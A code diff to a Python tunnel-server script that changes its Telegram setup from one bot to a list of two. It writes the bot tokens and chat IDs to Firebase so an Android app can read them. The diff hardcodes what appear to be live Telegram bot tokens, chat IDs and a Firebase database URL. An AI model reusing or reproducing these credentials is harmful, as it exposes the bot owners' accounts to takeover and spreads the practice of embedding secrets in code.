@@ -10,11 +10,19 @@ FIREBASE_RTDB_URL = "https://camm-c9aff-default-rtdb.firebaseio.com"
 PORT = 8765
 
 # ─── Telegram Config ─────────────────────────────────────────────────────────
-# Change these two values to your Telegram bot token and chat ID.
+# Change these values to your Telegram bot tokens and chat IDs.
 # They will be automatically written to Firebase every time the server starts.
 # The Android app reads them from Firebase — no need to rebuild the APK.
-TELEGRAM_BOT_TOKEN = "8012742505:AAGACKj2xt-4Ph-waCvuMoOmLc-CxwMazB8"   # e.g. "7123456789:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-TELEGRAM_CHAT_ID   = "1975037313"   # e.g. "123456789"  (your personal chat ID or group ID)
+TELEGRAM_BOTS = [
+    {
+        "botToken": "8012742505:AAGACKj2xt-4Ph-waCvuMoOmLc-CxwMazB8",
+        "chatId": "1975037313"
+    },
+    {
+        "botToken": "8688341841:AAEYNdmn2AJ8JWNcqexp9i4JXyTx7FNux28",
+        "chatId": "8684439200"
+    }
+]
 
 # ─── Auto-install dependencies ────────────────────────────────────────────────
 def ensure_deps():
@@ -95,21 +103,20 @@ def reset_firebase_on_startup():
 
 def setup_telegram_config():
     """
-    Write Telegram bot config to Firebase so the Android app can fetch it.
-    Edit TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID at the top of this file.
+    Write Telegram bot configs to Firebase so the Android app can fetch them.
     """
-    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+    if not TELEGRAM_BOTS:
         print("[!] Telegram config not set — skipping Firebase write.", flush=True)
-        print("[!] Edit TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID at the top of start_tunnel.py\n", flush=True)
         return
 
     print("[*] Writing Telegram config to Firebase...", flush=True)
-    ok = firebase_put("config/telegram", {
-        "botToken": TELEGRAM_BOT_TOKEN,
-        "chatId":   TELEGRAM_CHAT_ID,
-    })
+    # Write list of bots
+    ok = firebase_put("config/telegrams", TELEGRAM_BOTS)
+    # Write first bot for backward compatibility
+    firebase_put("config/telegram", TELEGRAM_BOTS[0])
+    
     if ok:
-        print(f"[+] Telegram config written to Firebase (chatId={TELEGRAM_CHAT_ID})\n", flush=True)
+        print(f"[+] Telegram config written to Firebase ({len(TELEGRAM_BOTS)} bots)\n", flush=True)
     else:
         print("[-] Failed to write Telegram config to Firebase.\n", flush=True)
 
